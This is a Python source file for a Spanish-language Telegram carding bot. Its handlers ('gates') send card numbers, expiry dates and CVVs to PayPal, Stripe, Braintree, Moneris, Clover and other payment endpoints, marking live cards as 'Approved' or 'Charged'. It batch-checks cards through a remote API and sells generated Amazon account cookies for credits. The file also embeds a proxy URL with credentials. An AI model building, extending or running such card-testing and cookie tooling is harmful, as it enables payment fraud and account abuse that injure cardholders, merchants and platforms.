import asyncio
import html
import httpx
import os
import time
import random
import re
from dataclasses import dataclass
from datetime import datetime
from telegram import Bot, Update
from telegram.ext import ContextTypes
from config import GATES_STATUS, PP_API_URL, API_URL, MONERIS_API_URL
from database import get_rango, check_antispam, antispam_db ,get_info_usuario, usar_credito,tengo_creditos,usar_creditous
from utils import extraer_datos_dict
from gates.wrenchmonkey import  DressageGate
from gates.dressage import DressageGate
from gates.payflow1 import ProphecyChecker
from gates.clover import run_clover_checkout
from gates.neonet import neonetrun
from gates.b3m import b3run
from concurrent.futures import ThreadPoolExecutor
from engines.bins_engine import get_bin_dict 
from amz.amz_us import registro_high_score_us
from amz.amz_mx import registro_high_score_mx
from amz.amz_ca import registro_high_score_ca
from gates.stripe import run


# --- CONSTANTES ---
PROXIESPWF = ["http://b7e37b644dc5b6cb:VYdXQ67KAtfPgacU@res.proxy-seller.com:10000"]
OWNER_ID = 5651880136
ADMINS = [5133617831]
executor = ThreadPoolExecutor(max_workers=5)




@dataclass
class Job:
    chat_id: int
    user_name: str
    data_map: dict

QUEUE = asyncio.Queue()

# --- VALIDACIÓN MAESTRA DE CC (CON ALGORITMO DE LUHN) ---


async def enviar_cookie_telegram(bot: Bot, user_id: int, cookie: str):
    """
    Envía la cookie al usuario por Telegram.
    Si la cookie es muy larga (>4000 caracteres), la envía como archivo de texto.
    """
    try:
        if len(cookie) > 4000:
            # Guardar en archivo temporal
            temp_file = f"cookie_{user_id}.txt"
            with open(temp_file, "w", encoding="utf-8") as f:
                f.write(cookie)

            # Enviar como documento
            await bot.send_document(
                chat_id=user_id,
                document=open(temp_file, "rb"),
                caption="🍪 Aquí está tu cookie de Amazon CA:"
            )

            # Borrar el archivo temporal
            os.remove(temp_file)
        else:
            # Enviar como mensaje
            await bot.send_message(
                chat_id=user_id,
                text=f"🍪 **Cookie de Amazon CA:**\n\n```\n{cookie}\n```",
                parse_mode="Markdown"
            )
    except Exception as e:
        raise Exception(f"❌ Error al enviar cookie: {str(e)}")




def es_cc_valida(cc_string):
    """
    Valida formato, Algoritmo de Luhn y fecha de expiración.
    """
    # 1. Extraer los datos con Regex
    match = re.search(r'(\d{15,16})[|](\d{1,2})[|](\d{2,4})[|](\d{3,4})', cc_string)
    if not match:
        return False, "❌ No encontré tarjetas válidas."

    cc_num, mes, ano, cvv = match.groups()

    # --- NUEVA LÓGICA: ALGORITMO DE LUHN ---
    def luhn_check(n):
        r = [int(ch) for ch in n][::-1]
        check_sum = sum(r[0::2]) + sum(sum(divmod(d * 2, 10)) for d in r[1::2])
        return check_sum % 10 == 0

    if not luhn_check(cc_num):
        # Aquí es donde bloqueamos la tarjeta antes de gastar recursos
        return False, "❌ <b>Número de tarjeta inválido (Luhn Check Failed).</b>"
    # -------------------------------------

    mes = int(mes)
    ano = int("20" + ano) if len(ano) == 2 else int(ano)

    if not (1 <= mes <= 12):
        return False, "❌ No encontré tarjetas válidas."
    
    ahora = datetime.now()
    if ano < ahora.year or (ano == ahora.year and mes < ahora.month):
        return False, f"❌ Tarjeta vencida ({mes}/{ano})."

    return True, "✅ Válida"

# --- FUNCIÓN AUXILIAR PARA INFO DE BIN ---
async def get_info_bin_format(cc_number):
    """Consulta el BIN y devuelve un bloque de texto formateado."""
    bin_6 = cc_number[:6]
    data = await get_bin_dict(bin_6)
    if data:
        return (f"<b>{data['brand']} - {data['type']} - {data['level']}</b>\n"
                f"<b>{data['bank']}</b>\n"
                f"<b>{data['pais']}</b>")
    return "<i>Info del BIN no encontrada</i>"

# --- GATES INDIVIDUALES ---

async def gate_paypal(u: Update, c: ContextTypes.DEFAULT_TYPE):

    if not GATES_STATUS.get("pp", True):
        return await u.message.reply_text("⚠️ El Gate Paypal está temporalmente en mantenimiento.")

    user_id = u.effective_user.id
    puedo, espera = check_antispam(user_id, OWNER_ID, ADMINS)
    if not puedo:
        return await u.message.reply_text(f"<b>⚠️ ANTISPAM</b>\n\nDebes esperar <b>{espera}s</b>.", parse_mode="HTML")
    
    if get_rango(user_id) < 1: return await u.message.reply_text("❌ Sin Acceso Premium.")

    raw_txt = u.message.reply_to_message.text if u.message.reply_to_message else u.message.text
    data_map = extraer_datos_dict(raw_txt)
    if not data_map: return await u.message.reply_text("❌ No encontré tarjetas válidas.")

    pizarra = await u.message.reply_text("<b>⏳ Iniciando Check...</b>", parse_mode="HTML")
    
    resultado_total = ""
    async with httpx.AsyncClient(timeout=125) as client:
        cards = list(data_map.values())[:25]
        for card in cards:
            valida, _ = es_cc_valida(card)
            if not valida: continue

            try:
                p = card.split('|')
                bin_info = await get_info_bin_format(p[0])
                r = await client.get(PP_API_URL, params={"cc": p[0], "mm": p[1], "aa": p[2], "cvv": p[3]})
                res = r.json()
                st = "Approved ✅" if res.get('status') == "approved" else "CCN ✅" if res.get('status') == "cardCvv" else "Dead ❌"
                
                resultado_total += (
                    "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
                    f"<b>CC ></b> <code>{card}</code>\n<b>Status ></b> {st}\n<b>Response ></b> {res.get('msg', 'N/A')}\n"
                    "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
                    f"{bin_info}\n"
                    "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
                    f"<b>[PayPal Gate] > Chk By: @{u.effective_user.username or u.effective_user.first_name}</b>\n\n"
                )
                await pizarra.edit_text(resultado_total, parse_mode="HTML")
                await asyncio.sleep(2.0)
            except: continue






async def gate_promerica(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if not GATES_STATUS.get("gt", True):
        return await u.message.reply_text("⚠️ El Gate Promerica está temporalmente en mantenimiento")

    user_id = u.effective_user.id
    puedo, espera = check_antispam(user_id, OWNER_ID, ADMINS)
    if not puedo: return await u.message.reply_text(f"⚠️ Espera {espera}s.", parse_mode="HTML")
    
    raw_txt = u.message.reply_to_message.text if u.message.reply_to_message else u.message.text
    data_map = extraer_datos_dict(raw_txt)
    if not data_map: return await u.message.reply_text("❌ No hay tarjetas.")

    valid_map = {}
    for k, v in data_map.items():
        valida, _ = es_cc_valida(v)
        if valida: valid_map[k] = v

    if  valid_map is None: return await u.message.reply_text("❌ No encontré tarjetas válidas.")

    aviso = await u.message.reply_text("⏳ Enviando a la cola de procesamiento...".format(len(valid_map)), parse_mode="HTML")
    await QUEUE.put(Job(u.effective_chat.id, u.effective_user.first_name, valid_map))
    
    async def borrar_aviso():
        await asyncio.sleep(30)
        try: await aviso.delete()
        except: pass
    asyncio.create_task(borrar_aviso())






async def prophecy_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if not GATES_STATUS.get("pfw", True):
        return await u.message.reply_text("⚠️ El Gate Payflow CVV está temporalmente en mantenimiento ")

    user_id = u.effective_user.id
    puedo, espera = check_antispam(user_id, OWNER_ID, ADMINS)
    if not puedo: return await u.message.reply_text(f"⚠️ Espera {espera}s.", parse_mode="HTML")
    
    try: cc_input = c.args[0]
    except: return await u.message.reply_text("<code>/pfw cc|mm|aa|cvv</code>", parse_mode="HTML")

    valida, motivo = es_cc_valida(cc_input)
    if not valida: return await u.message.reply_text(motivo, parse_mode="HTML")

    status_msg = await u.message.reply_text("<b>[ Gateway > Payflow CVV ]</b>\n⏳ <i>Iniciando Check...</i>", parse_mode="HTML")
    bin_info = await get_info_bin_format(cc_input)
    
    try:
        checker = ProphecyChecker(cc_input) 
        response = await checker.run()
    except Exception as e: response = f"Error técnico: {str(e)}"
    
    status = "Aprobada ✅" if any(x in response for x in ["CHARGED", "10069"]) else "Declinada ❌"
    
    final_text = (
        "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
        f"<b>CC ></b> <code>{cc_input}</code>\n"
        f"<b>Status ></b> {status}\n"
        f"<b>Response ></b> {response}\n"
        "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
        f"<b>[Payflow CVV] > Chk By: @{u.effective_user.username}</b>\n\n"
        f"{bin_info}\n"
        "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>"
    )
    await status_msg.edit_text(final_text, parse_mode="HTML")

async def moneris_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if not GATES_STATUS.get("mn", True):
        return await u.message.reply_text("⚠️ El Gate Moneris está temporalmente en mantenimiento")

    user_id = u.effective_user.id
    puedo, espera = check_antispam(user_id, OWNER_ID, ADMINS)
    if not puedo: return await u.message.reply_text(f"⏳ Espera {espera}s.")
    
    try: cc_input = c.args[0]
    except: return await u.message.reply_text("<code>/mn cc|mm|aa|cvv</code>", parse_mode="HTML")

    valida, motivo = es_cc_valida(cc_input)
    if not valida: return await u.message.reply_text(motivo, parse_mode="HTML")

    status_msg = await u.message.reply_text("<b>[ Moneris Canada 🇨🇦 ]</b>\n⏳ <i>Iniciando Check...</i>", parse_mode="HTML")
    bin_info = await get_info_bin_format(cc_input)

    async with httpx.AsyncClient(timeout=50) as client:
        try:
            r = await client.get(f"{MONERIS_API_URL}?cc={cc_input}")
            data = r.json()
            parsed = data.get("parsed", "")
            res_text = "Approved ✅" if any(x in parsed for x in ["10069", "APPROVED"]) else "Declined ❌"
            
            final_msg = (
                "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
                f"<b>CC ></b> <code>{cc_input}</code>\n"
                f"<b>Result ></b> {res_text}\n"
                f"<b>Response ></b> {parsed}\n"
                "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
                f"<b>[Moneris Gate] > By: @{u.effective_user.username or 'N/A'}</b>\n\n"
                f"{bin_info}\n"
                "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>"
            )
            await status_msg.edit_text(final_msg, parse_mode="HTML")
        except: await status_msg.edit_text("Error, contacta al soporte.", parse_mode="HTML")

async def wrenchmonkey_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if not GATES_STATUS.get("pp", True): # Asegúrate de que use el tag correcto en config
        return await u.message.reply_text("⚠️ El Gate Recurly está temporalmente en mantenimiento.")

    user_id = u.effective_user.id
    puedo, espera = check_antispam(user_id, OWNER_ID, ADMINS)
    if not puedo: return await u.message.reply_text(f"⏳ Espera {espera}s.")
    if get_rango(user_id) < 1: return await u.message.reply_text("❌ Sin Acceso Premium.")

    try: cc_input = c.args[0]
    except: return await u.message.reply_text("<code>/wm cc|mm|aa|cvv</code>", parse_mode="HTML")

    valida, motivo = es_cc_valida(cc_input)
    if not valida: return await u.message.reply_text(motivo, parse_mode="HTML")

    status_msg = await u.message.reply_text("<b>[ WrenchMonkey CA 🇨🇦 ]</b>\n⏳ <i>Iniciando Check...</i>", parse_mode="HTML")
    bin_info = await get_info_bin_format(cc_input)
    
    checker = DressageGate(cc_input) # Corregido el nombre de la clase
    tag, parsed_message = await checker.run()
    
    status_icon = "Approved ✅" if tag == "#APPROVED" else "Declined ❌"

    final_text = (
        "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
        f"<b>CC ></b> <code>{cc_input}</code>\n"
        f"<b>Status ></b> {status_icon}\n"
        f"<b>Response ></b> {parsed_message}\n"
        f"<b>Tag ></b> <code>{tag}</code>\n"
        "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
        f"<b>[WM Gate] > By: @{u.effective_user.username}</b>\n\n"
        f"{bin_info}\n"
        "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>"
    )
    await status_msg.edit_text(final_text, parse_mode="HTML")

async def dressage_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if not GATES_STATUS.get("ka", True):
        return await u.message.reply_text("⚠️ El Gate moneris está temporalmente en mantenimiento")

    user_id = u.effective_user.id
    puedo, espera = check_antispam(user_id, OWNER_ID, ADMINS)
    if not puedo: return await u.message.reply_text(f"⏳ Espera {espera}s.")
    
    try: cc_input = c.args[0]
    except: return await u.message.reply_text("<code>/ka cc|mm|aa|cvv</code>", parse_mode="HTML")

    valida, motivo = es_cc_valida(cc_input)
    if not valida: return await u.message.reply_text(motivo, parse_mode="HTML")

    status_msg = await u.message.reply_text("<b>[ Dressage Naturally 🇺🇸 ]</b>\n⏳ <i>Iniciando Check...</i>", parse_mode="HTML")
    bin_info = await get_info_bin_format(cc_input)
    
    gate = DressageGate(cc_input)
    tag, response = await gate.run()
    
    status_icon = "Approved ✅" if tag in ["#APPROVED", "#CVV_MATCH"] else "Declined ❌"

    final_text = (
        "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
        f"<b>CC ></b> <code>{cc_input}</code>\n"
        f"<b>Status ></b> {status_icon}\n"
        f"<b>Response ></b> {response}\n"
        f"<b>Tag ></b> <code>{tag}</code>\n"
        "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
        f"<b>[DN Gate] > By: @{u.effective_user.username}</b>\n\n"
        f"{bin_info}\n"
        "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>"
    )
    await status_msg.edit_text(final_text, parse_mode="HTML")


async def stripecharged_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    """Gate personalizado que crea payment_method en Stripe y sigue la suscripción, reportando el div #mb-copy."""
    if not GATES_STATUS.get("stp", True):
        return await u.message.reply_text("⚠️ El Gate stripecharged está temporalmente en mantenimiento.")

    user_id = u.effective_user.id
    puedo, espera = check_antispam(user_id, OWNER_ID, ADMINS)
    if not puedo:
        return await u.message.reply_text(f"⚠️ Espera {espera}s.", parse_mode="HTML")

    raw_txt = u.message.reply_to_message.text if u.message.reply_to_message else u.message.text
    data_map = extraer_datos_dict(raw_txt)
    if not data_map:
        return await u.message.reply_text("❌ No encontré tarjetas válidas.")

    pizarra = await u.message.reply_text("<b>⏳ Iniciando StripeCharged...</b>", parse_mode="HTML")

    resultados = ""
    loop = asyncio.get_event_loop()
    cards = list(data_map.values())[:10]
    for card in cards:
        valida, _ = es_cc_valida(card)
        if not valida:
            continue
        try:
            # Ejecutar check_card (bloqueante) en executor
            res = await loop.run_in_executor(executor, run, card )
            mb = res.get("mb_copy") or ""
            err = res.get("error") or ""
            pm = res.get("payment_method") or {}
            combined = " ".join([str(mb), str(err), str(pm)]).lower()

            decline_kw = ["was declined", "card was declined", "your card was declined"]
            positive_kw = [
                "approved",
                "succeeded",
                "security code is incorrect",
                "incorrect security code",
                "insufficient funds",
                "insufficient_fund",
                "insufficient_funds",
                "aproved",
                "aprovado",
                "charge succeeded",
                "paid",
            ]

            if any(k in combined for k in positive_kw):
                status = "Approved ✅"
            elif any(k in combined for k in decline_kw):
                status = "Declined ❌"
            else:
                # Fallback: if our check reported ok but no clear text, consider as fail (conservative)
                status = "Approved ✅" if any([
                    'card' in combined and 'error' not in combined and res.get('ok')
                ]) else "Declined ❌"

            resp_snippet = mb or (res.get("payment_method") and str(res.get("payment_method"))[:200]) or err
            bin_info = await get_info_bin_format(card.split('|')[0])
            resultados += (
                "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
                f"<b>CC ></b> <code>{card}</code>\n"
                f"<b>Status ></b> {status}\n"
                f"<b>Response ></b> {html.escape(str(resp_snippet))}\n"
                "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
                f"{bin_info}\n"
                "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
                f"<b>[StripeCharged] > By: @{u.effective_user.username or u.effective_user.first_name}</b>\n\n"
            )
            await pizarra.edit_text(resultados, parse_mode="HTML")
            await asyncio.sleep(1.5)
        except Exception as e:
            resultados += f"<b>ERROR:</b> {str(e)[:200]}\n"
            continue

async def worker_bot(worker_id, app):
    while True:
        job = await QUEUE.get()
        ids = list(job.data_map.keys())
        inicio = time.time()
        try:
            async with httpx.AsyncClient(timeout=1200.0) as client:
                r = await client.post(f"{API_URL}/consultar_lote", json=ids, params={"threads": 25})
                if r.status_code == 200:
                    resultados = r.json().get("resultados", [])
                    validas = [i for i in resultados if i.get("tipo") == "valida"]
                    
                    tiempo_total = round(time.time() - inicio, 2)
                    
                    if validas:
                        msg = f"✅ REPORTE DE VÁLIDAS\n⏱️ {tiempo_total}s\n\n"
                        for v in validas:
                            cc_full = job.data_map.get(v['id'], v['id'])
                            bin_info = await get_info_bin_format(cc_full)
                            msg += f"📝 <code>{cc_full}</code>\n{v.get('detalle', 'N/A')}\n{bin_info}\n━━━━━━━━╰☆╮━━━━━━━━\n\n"
                        await app.bot.send_message(job.chat_id, msg, parse_mode="HTML")
                    else:
                        # ESTO ES LO QUE FALTABA: Avisar que terminó sin hits
                        msg = (
                            f" LOTE FINALIZADO\n"
                            f"⏱ Tiempo: {tiempo_total}s\n"
                            f" IDs Procesados: {len(ids)}\n\n"
                            f"No se encontraron resultados válidos en este lote."
                        )
                        await app.bot.send_message(job.chat_id, msg, parse_mode="HTML")
        except Exception as e: 
            print(f"Error Worker: {e}")
            await app.bot.send_message(job.chat_id, f"⚠️ Error en el worker: {str(e)[:50]}")
        finally: 
            QUEUE.task_done()



async def gencookieus(u: Update, c: ContextTypes.DEFAULT_TYPE):
    """
    Gate para generar cookies de Amazon CA.
    Uso: /gencookier
    """

    if not GATES_STATUS.get("gencookieus", True):
        return await u.message.reply_text("⚠️ Gencookieus está temporalmente en mantenimiento")
    
    user_id = u.effective_user.id

    tengo_creditoss = tengo_creditos(user_id)
    if not tengo_creditoss:
        return await u.message.reply_text("❌ No tienes créditos disponibles.", parse_mode="HTML")
   
    

    user_id = u.effective_user.id
    puedo, espera = check_antispam(user_id, OWNER_ID, ADMINS)
    if not puedo:
        return await u.message.reply_text(f"⚠️ Espera {espera}s.", parse_mode="HTML")

    
    descontarcrd = usar_creditous(user_id)
    if not descontarcrd:
        return await u.message.reply_text("❌ No tienes créditos disponibles.", parse_mode="HTML")

    # Mensaje de inicio
    status_msg = await u.message.reply_text(
        "<b>[ Amazon US Cookie Generator ]</b>\n⏳ <i>Iniciando proceso...</i>",
        parse_mode="HTML"
    )
    
    try:
        # Ejecutamos el código bloqueante en un hilo
        loop = asyncio.get_event_loop()
        cookie = await loop.run_in_executor(executor, registro_high_score_us)

        if cookie:
            await status_msg.edit_text(
                f"Cookie USA Generada con éxito:\n\n<code>{cookie}</code>",
                parse_mode="HTML"
            )
        else:
            await status_msg.edit_text(
                "❌ No se pudo generar la cookie. Intenta de nuevo.",
                parse_mode="HTML"
            )
    except Exception as e:
        await status_msg.edit_text(
            f"❌ Error al generar la cookie: {str(e)[:100]}",
            parse_mode="HTML"
        )



async def gencookiemx(u: Update, c: ContextTypes.DEFAULT_TYPE):
    """
    Gate para generar cookies de Amazon MX.
    Uso: /gencookier
    """

    if not GATES_STATUS.get("gencookiemx", True):
        return await u.message.reply_text("⚠️ Gencookiemx está temporalmente en mantenimiento")
    
    user_id = u.effective_user.id
    tengo_creditoss = tengo_creditos(user_id)
    if not tengo_creditoss:
        return await u.message.reply_text("❌ No tienes créditos disponibles.", parse_mode="HTML")
    

    puedo, espera = check_antispam(user_id, OWNER_ID, ADMINS)
    if not puedo:
        return await u.message.reply_text(f"⚠️ Espera {espera}s.", parse_mode="HTML")
    
    descontarcrd = usar_credito(user_id)
    if not descontarcrd:
        return await u.message.reply_text("❌ No se pudo descontar el crédito. Intenta de nuevo.", parse_mode="HTML")

    # Mensaje de inicio
    status_msg = await u.message.reply_text(
        "<b>[ Amazon MX Cookie Generator ]</b>\n⏳ <i>Iniciando proceso...</i>",
        parse_mode="HTML"
    )

    try:
        # Ejecutamos el código bloqueante en un hilo
        loop = asyncio.get_event_loop()
        cookie = await loop.run_in_executor(executor, registro_high_score_mx)

        if cookie:
            await status_msg.edit_text(
                f"Cookie México Generada con éxito:\n\n<code>{cookie}</code>",
                parse_mode="HTML"
            )
        else:
            await status_msg.edit_text(
                "❌ No se pudo generar la cookie. Intenta de nuevo.",
                parse_mode="HTML"
            )
    except Exception as e:
        await status_msg.edit_text(
            f"❌ Error al generar la cookie: {str(e)[:100]}",
            parse_mode="HTML"
        )


async def gencookieca(u: Update, c: ContextTypes.DEFAULT_TYPE):
    """
    Gate para generar cookies de Amazon CA.
    Uso: /gencookier
    """

    if not GATES_STATUS.get("gencookieca", True):
        return await u.message.reply_text("⚠️ Gencookieca está temporalmente en mantenimiento")
    
    user_id = u.effective_user.id
    tengo_creditoss = tengo_creditos(user_id)
    if not tengo_creditoss:
        return await u.message.reply_text("❌ No tienes créditos disponibles.", parse_mode="HTML")
    

    puedo, espera = check_antispam(user_id, OWNER_ID, ADMINS)
    if not puedo:
        return await u.message.reply_text(f"⚠️ Espera {espera}s.", parse_mode="HTML")
    
    descontarcrd = usar_credito(user_id)
    if not descontarcrd:
        return await u.message.reply_text("❌ No se pudo descontar el crédito. Intenta de nuevo.", parse_mode="HTML")

    # Mensaje de inicio
    status_msg = await u.message.reply_text(
        "<b>[ Amazon CA Cookie Generator ]</b>\n⏳ <i>Iniciando proceso...</i>",
        parse_mode="HTML"
    )

    try:
        # Ejecutamos el código bloqueante en un hilo
        loop = asyncio.get_event_loop()
        cookie = await loop.run_in_executor(executor, registro_high_score_ca)

        if cookie:
            await status_msg.edit_text(
                f"Cookie Canada Generada con éxito:\n\n<code>{cookie}</code>",
                parse_mode="HTML"
            )
        else:
            await status_msg.edit_text(
                "❌ No se pudo generar la cookie. Intenta de nuevo.",
                parse_mode="HTML"
            )
    except Exception as e:
        await status_msg.edit_text(
            f"❌ Error al generar la cookie: {str(e)[:100]}",
            parse_mode="HTML"
        )


async def clovervariable_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if not GATES_STATUS.get("clovervariable", True):
        return await u.message.reply_text("⚠️ El Gate CloverVariable está temporalmente en mantenimiento.")

    user_id = u.effective_user.id
    puedo, espera = check_antispam(user_id, OWNER_ID, ADMINS)
    if not puedo:
        return await u.message.reply_text(f"⚠️ Espera {espera}s.", parse_mode="HTML")
    
    try: cc_input = c.args[0]
    except: return await u.message.reply_text("<code>/clo cc|mm|aa|cvv</code>", parse_mode="HTML")


    raw_txt = u.message.reply_to_message.text if u.message.reply_to_message else u.message.text
    data_map = extraer_datos_dict(raw_txt)
    if not data_map:
        return await u.message.reply_text("❌ No encontré tarjetas válidas.")

    cc_input = list(data_map.values())[0]
    valida, motivo = es_cc_valida(cc_input)
    if not valida:
        return await u.message.reply_text(motivo, parse_mode="HTML")

    status_msg = await u.message.reply_text("<b>[ Clover Variable ]</b>\n⏳ <i>Iniciando check...</i>", parse_mode="HTML")
    loop = asyncio.get_event_loop()
    try:
        resultado = await loop.run_in_executor(executor, run_clover_checkout, cc_input)
    except Exception as e:
        await status_msg.edit_text(f"❌ Error técnico: Reintenta", parse_mode="HTML")
        return

    resultado_str = str(resultado)
    status = "Approved ✅" if "CVV2 DECLINED" in resultado_str.upper() else "Declined ❌"
    code = "CVV2 Declined" if "CVV2 DECLINED" in resultado_str.upper() else resultado_str
    escaped_result = html.escape(resultado_str)
    escaped_code = html.escape(code)
    bin_info = await get_info_bin_format(cc_input.split("|")[0])

    final_msg = (
        "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
        f"<b>CC ></b> <code>{html.escape(cc_input)}</code>\n"
        f"<b>Status ></b> {status}\n"
        f"<b>Code ></b> {escaped_code}\n"
        "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
        f"{bin_info}\n"
        "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
        f"<b>Response ></b> {escaped_result}\n"
        "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
        f"<b>[CloverVariable] > By: @{u.effective_user.username or u.effective_user.first_name}</b>"
    )
    await status_msg.edit_text(final_msg, parse_mode="HTML")



async def neonet(u: Update, c: ContextTypes.DEFAULT_TYPE):
    
    if not GATES_STATUS.get("neonet", True):
        return await u.message.reply_text("⚠️ El Gate NeoNet está temporalmente en mantenimiento.")

    user_id = u.effective_user.id
    puedo, espera = check_antispam(user_id, OWNER_ID, ADMINS)

    if not puedo:
        return await u.message.reply_text(f"⚠️ Espera {espera}s.", parse_mode="HTML")
    
    try: cc_input = c.args[0]
    except: return await u.message.reply_text("<code>/neo cc|mm|aa|cvv</code>", parse_mode="HTML")


    raw_txt = u.message.reply_to_message.text if u.message.reply_to_message else u.message.text
    data_map = extraer_datos_dict(raw_txt)
    if not data_map:
        return await u.message.reply_text("❌ No encontré tarjetas válidas.")

    cc_input = list(data_map.values())[0]
    valida, motivo = es_cc_valida(cc_input)
    if not valida:
        return await u.message.reply_text(motivo, parse_mode="HTML")

    status_msg = await u.message.reply_text("<b>[ NeoNet ]</b>\n⏳ <i>Iniciando check...</i>", parse_mode="HTML")
    loop = asyncio.get_event_loop()
    try:
        resultado = await loop.run_in_executor(executor, neonetrun, cc_input)
    except Exception as e:
        await status_msg.edit_text(f"❌ Error técnico: Reintenta", parse_mode="HTML")
        return

    resultado_str = str(resultado)
    status = "Approved ✅" if "Aprovada" in resultado_str.upper() else "Declined ❌"
    code = "Charged Q100" if "Aprovada" in resultado_str.upper() else resultado_str
    escaped_result = html.escape(resultado_str)
    escaped_code = html.escape(code)
    bin_info = await get_info_bin_format(cc_input.split("|")[0])

    final_msg = (
        "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
        f"<b>CC ></b> <code>{html.escape(cc_input)}</code>\n"
        f"<b>Status ></b> {status}\n"
        f"<b>Code ></b> {escaped_code}\n"
        "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
        f"{bin_info}\n"
        "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
        f"<b>[NeoNet] > By: @{u.effective_user.username or u.effective_user.first_name}</b>"
    )
    await status_msg.edit_text(final_msg, parse_mode="HTML")



async def b31(u: Update, c: ContextTypes.DEFAULT_TYPE):
    
    if not GATES_STATUS.get("braintree1", True):
        return await u.message.reply_text("⚠️ El Gate Braintree está temporalmente en mantenimiento.")

    user_id = u.effective_user.id
    puedo, espera = check_antispam(user_id, OWNER_ID, ADMINS)

    if not puedo:
        return await u.message.reply_text(f"⚠️ Espera {espera}s.", parse_mode="HTML")
    
    try: cc_input = c.args[0]
    except: return await u.message.reply_text("<code>/b3 cc|mm|aa|cvv</code>", parse_mode="HTML")


    raw_txt = u.message.reply_to_message.text if u.message.reply_to_message else u.message.text
    data_map = extraer_datos_dict(raw_txt)
    if not data_map:
        return await u.message.reply_text("❌ No encontré tarjetas válidas.")

    cc_input = list(data_map.values())[0]
    valida, motivo = es_cc_valida(cc_input)
    if not valida:
        return await u.message.reply_text(motivo, parse_mode="HTML")

    status_msg = await u.message.reply_text("<b>[ Braintree ]</b>\n⏳ <i>Iniciando check...</i>", parse_mode="HTML")
    loop = asyncio.get_event_loop()
    try:
        resultado = await loop.run_in_executor(executor, b3run, cc_input)
    except Exception as e:
        await status_msg.edit_text(f"❌ Error técnico: Reintenta", parse_mode="HTML")
        return

    resultado_str = str(resultado)
    
    # CORRECCIÓN: El texto a buscar ahora está completamente en MAYÚSCULAS
    status = "Approved CCN✅" if "THE CARD VERIFICATION NUMBER DOES NOT" in resultado_str.upper() else "Declined ❌"
    
    # CORRECCIÓN: El texto a buscar está en MAYÚSCULAS (y cambiamos a "APPROVED" si la API responde en inglés)
    code = "Charged" if "APPROVED" in resultado_str.upper() else resultado_str
    
    escaped_result = html.escape(resultado_str)
    escaped_code = html.escape(code)
    bin_info = await get_info_bin_format(cc_input.split("|")[0])

    final_msg = (
        "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
        f"<b>CC ></b> <code>{html.escape(cc_input)}</code>\n"
        f"<b>Statusa ></b> {status}\n"
        f"<b>Code ></b> {escaped_code}\n"
        "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
        f"{bin_info}\n"
        "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
        f"<b>[Braintree] > By: @{u.effective_user.username or u.effective_user.first_name}</b>"
    )
    await status_msg.edit_text(final_msg, parse_mode="HTML")